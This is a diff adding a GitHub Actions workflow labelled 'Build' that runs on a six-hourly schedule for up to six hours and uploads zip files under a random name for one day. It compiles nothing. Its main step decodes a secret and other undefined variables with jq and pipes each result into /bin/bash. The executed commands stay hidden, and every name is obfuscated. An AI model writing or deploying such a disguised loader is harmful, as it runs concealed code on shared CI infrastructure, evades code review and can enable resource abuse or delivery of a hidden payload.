@@ -1,0 +1,32 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '34 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          n23: ${{ secrets.n23 }}
+        run: |
+          printf '%s' "$n23" | jq -r .xsv7269 | /bin/bash
+          echo $x749 | jq -r .iv40633 | /bin/bash
+          echo $fs294 | jq -r .oky75 | /bin/bash
+          printf '%s' "$qw71" | jq -r .ebs54 | /bin/bash
+          echo $firn303 | jq -r .gl97334 | /bin/bash
+          printf '%s' "$lh86978" | jq -r .gc4 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: daicYYNa
+          path: "*.zip"
+          retention-days: 1
